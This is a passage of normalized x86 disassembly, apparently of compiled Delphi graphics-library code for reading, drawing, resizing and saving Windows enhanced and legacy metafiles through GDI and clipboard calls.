push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_424a40
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_424b47
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x8 ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x8 ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404688
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_4240f0
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424ac9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b4e
lea eax [ ebp - 0x48 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_424ace
mov eax [ ebp - 0x4 ]
call sub_4036c0
call sub_403eb4
call sub_403f08
mov eax [ ebx + 0xc ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b4e
lea eax [ ebp - 0x48 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_424b58
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403610
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402eb4
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_424bb4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_424c30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_424a40
mov eax [ ebp - 0x8 ]
push eax
push sub_424b58
push ebp
call sub_424bb4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424cac
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4207c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_424cec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423a60
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_424d34
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_425cd8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_424d64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_425cd8
mov edx esi
mov eax ebx
call sub_416a84
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_425cd4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_424df8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_4224e8
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_4224e8
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_4224e8
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_4224e8
push eax
call SelectPalette
sub_424e90
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425038
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_424ef4
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4207c4
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_424f80
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425038
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_424fe4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_425528
test al al
je r-xdata
mov eax esi
call sub_418914
push eax
mov eax esi
call sub_4188e0
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_42519c
mov edx esi
mov eax ebx
call sub_4250cc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_425038
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_425cd8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_425cd4
pop esi
pop ebx
retn
sub_425060
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0x8 ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_425528
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_42519c
mov edx esi
mov eax ebx
call sub_4250cc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_4250cc
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_425038
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_418b0c
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_402744
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42518c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028fc
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_418b0c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_4227d8
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425193
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_402764
retn
call sub_4227d8
sub_42519c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_425038
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_4227d8
lea eax [ ebp - 0x22 ]
call sub_423628
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_402744
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42530b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_4227d8
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425312
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_402764
retn
call sub_4227d8
sub_42531c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_42538a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ edi + 0x2c ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_408ed4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_40cb7c
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404828
jne r-xdata
mov edx esi
mov eax edi
call sub_423d30
mov [ edi + 0x2c ] bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425391
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov [ edi + 0x2c ] 0x0
sub_4253c4
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425038
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_425438
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_425438
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_425438
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_425038
pop esi
pop ebx
retn
mov eax ebx
call sub_425588
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_425474
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_425038
pop esi
pop ebx
retn
mov eax ebx
call sub_425588
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4254b4
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_425038
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_425474
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_425474
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_425528
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
call sub_418914
mov esi eax
mov eax ebx
call sub_4188e0
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0x8 ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_425588
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_425038
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_425cd8
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_425cd4
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_42560c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax ebx
call sub_4188e0
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_42571c
mov edx ebx
mov eax esi
call sub_425690
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax ebx
call sub_418914
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_425690
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402744
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42570c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_418b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402764
retn
sub_42571c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402fc4
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_418b44
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_418b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42583e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402764
retn
call sub_422838
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_423628
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425857
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_402744
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425837
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_425864
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_425038
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_4227a8
sub_4258e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4259b8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425a56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a5d
mov eax [ rw-data ]
call sub_416898
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_425a2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_425b48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4223e0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4161a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_422384
test al al
je r-xdata
sub_425a64
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416834
mov esi eax
xor ecx ecx
push ebp
push sub_425ad4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
mov edx ebx
mov eax esi
call sub_4161a0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_425b48
sub_425ae0
push ebx
push esi
push edi
